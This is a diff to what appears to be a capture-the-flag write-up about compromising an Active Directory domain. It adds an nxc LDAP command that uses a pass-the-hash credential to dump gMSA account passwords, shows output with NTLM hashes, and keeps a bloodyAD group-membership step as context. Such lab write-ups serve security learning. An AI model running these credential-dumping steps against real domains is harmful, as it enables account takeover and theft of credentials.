@@ -912,8 +912,16 @@ bloodyAD --host dc01.trask.hsm -d trask.hsm -k add groupMember 'CN=SENTINEL SERV
 
 Then ill add the account to the group
 
-# Dumping gMSA 
+# Dumping gMSA to compromise `svc_mmold$`
 
 ```python
-
+nxc ldap dc01.trask.hsm -u 'sentinel-5TainB' -H '1217D4374DAA2B125EBA231EF9945ACA' -k --gmsa
+LDAP        dc01.trask.hsm  389    DC01             [*] None (name:DC01) (domain:trask.hsm) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc01.trask.hsm  389    DC01             [+] trask.hsm\sentinel-5TainB:1217D4374DAA2B125EBA231EF9945ACA 
+LDAP        dc01.trask.hsm  389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.trask.hsm  389    DC01             Account: svc_mmold$           NTLM: 71fc6c4eb836275709e4e045ece2f9ec     PrincipalsAllowedToReadPassword: Sentinel Service Account Readers
+LDAP        dc01.trask.hsm  389    DC01             Account: sentinel-5TainB$     NTLM: 1217d4374daa2b125eba231ef9945aca     PrincipalsAllowedToReadPassword: ['DC01$', 'Sentinel Service Account Readers']
 ```
+
+Nothing showed up in bloodhound but going off a hunch based off the group name i made an educated guess i could read GMSA
+
